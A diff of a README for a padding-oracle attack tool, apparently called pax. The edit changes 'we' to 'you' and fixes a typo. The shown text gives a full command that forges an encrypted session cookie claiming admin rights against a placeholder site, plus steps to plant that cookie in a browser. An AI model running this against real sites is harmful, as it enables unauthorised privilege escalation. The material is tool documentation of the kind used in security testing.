@@ -38,19 +38,19 @@ This will hopefully give you some plaintext, perhaps something like:
 
 It looks like you could elevate your privileges here!
 
-We can attempt to do so by first generating our own encrypted data that the oracle will decrypt back to some sneaky plaintext:
+You can attempt to do so by first generating your own encrypted data that the oracle will decrypt back to some sneaky plaintext:
 
 ```bash
 pax encrypt --url https://target.site/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D" --plain-text '{"user_id": 456, "is_admin": true}'
 ```
 
-This will spit out another base64 encoeed set of encrypted data, perhaps something like:
+This will spit out another base64 encoded set of encrypted data, perhaps something like:
 
 ```
 dGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU=
 ```
 
-Now we open our browser and set the value of the `SESS` cookie to the above value. Loading the original oracle page we should now see we are elevated to admin. 
+Now you can open your browser and set the value of the `SESS` cookie to the above value. Loading the original oracle page, you should now see you are elevated to admin level. 
 
 ## How does this work?
 
